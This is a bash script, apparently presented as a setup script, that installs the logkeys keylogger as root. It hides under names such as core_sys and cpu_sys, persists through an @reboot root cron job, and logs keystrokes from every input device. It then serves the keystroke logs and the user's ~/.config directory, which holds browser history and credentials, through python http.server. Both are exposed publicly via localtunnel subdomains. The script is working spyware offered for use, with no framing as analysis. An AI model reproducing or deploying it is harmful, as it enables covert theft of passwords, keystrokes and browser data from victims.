#! /bin/bash

# Check if running as root (root is required to install packages)
if [ `id -u` -ne 0 ]; then
    echo "You must be root to run this script, Exiting.."
    exit 1
fi

# Check if process already running (prevents multiple instances)
CHECK_PROC=$(ps aux | grep -i "setup.sh" | grep -v "grep" | wc -l)
if [ ${CHECK_PROC} -gt 3 ]; then
    echo "Another instance of this script is already running, Exiting.."
    exit 1
fi

# Check if program is already installed (if not, install it)
INSTALL_DIR="/usr/local/core_sys"
INSTALL() {
    echo "Installing.."
    apt install curl
    curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -
    apt install -y python3 build-essential autotools-dev autoconf kbd git nodejs
    rm -rf ${INSTALL_DIR}
    git clone https://github.com/kernc/logkeys.git ${INSTALL_DIR}
    cd ${INSTALL_DIR}
    ./autogen.sh
    cd ${INSTALL_DIR}/build
    ../configure
    
    make
    make install
    
    npm install -g localtunnel
    logkeys --export-keymap en.us
}

if ! command -v logkeys >/dev/null 2>&1
then
    INSTALL
fi

# Check if install directory exists (if not, create it)

if [ ! -d ${INSTALL_DIR} ]; then
    mkdir ${INSTALL_DIR}
fi

# Check if shell script exists
SHELL_DEST="${INSTALL_DIR}/core.sh"
ME=$(basename $0)
MY_PATH=$(readlink -f ${ME})
if [ ! -f ${SHELL_DEST} ]; then
    echo "Creating shell script.."
    touch ${SHELL_DEST}
    cp ${MY_PATH} ${SHELL_DEST}
    chmod +x ${SHELL_DEST}
fi

# Check if cron process exists to avoid multiple instances
CRON_FILE="/var/spool/cron/root"
if [ ! -f ${CRON_FILE} ]; then
    echo "cron file for root doesnot exist, creating.."
    touch $CRON_FILE
    /usr/bin/crontab ${CRON_FILE}
    echo "@reboot /bin/bash $SHELL_DEST" >> ${CRON_FILE}
    crontab ${CRON_FILE}
    echo "Crontab created is running"
fi


# Start keylogger
KEYLOGGER() {
    echo "Starting keylogger.."
    cd ${INSTALL_DIR}
    sudo logkeys --export-keymap en_US.keymap
    for i in $(seq 1 31); do
        PROC_NAME="cpu_sys${i}"
        OUTPUT_FILE="core_sys${i}.md"
        EVENT_NAME="event${i}"

        COMMAND="logkeys -s -d ${EVENT_NAME} --output ${OUTPUT_FILE} --keymap en_US.keymap"
        rm -rf /var/run/logkeys.pid
        bash -c "exec -a ${PROC_NAME} ${COMMAND} &"
        rm -rf /var/run/logkeys.pid
    done
}

# FTP Servert
FTP_SERVER() {
    echo "Starting ftp server.."
    cd ${INSTALL_DIR}
    cmd1="python3 -m http.server 31"
    eval "${cmd1}" &>/dev/null & disown;

    cmd2="lt --local-host 0.0.0.0 --port 31 --subdomain logger812432"
    eval "${cmd2}" &>/dev/null & disown;
}

# Browser History FTP Server
HOSTNAME=$(logname)
CONFIG_PATH="/home/${HOSTNAME}/.config"
BROWSER_HISTORY() {
    echo "Starting browser history.."
    cd ${CONFIG_PATH}
    cmd1="python3 -m http.server 32"
    eval "${cmd1}" &>/dev/null & disown;
    cmd2="lt --local-host 0.0.0.0 --port 32 --subdomain config812432"
    eval "${cmd2}" &>/dev/null & disown;
}

# Start process
MAIN() {
    echo "Starting main.."
    KEYLOGGER
    FTP_SERVER
    BROWSER_HISTORY
}

MAIN
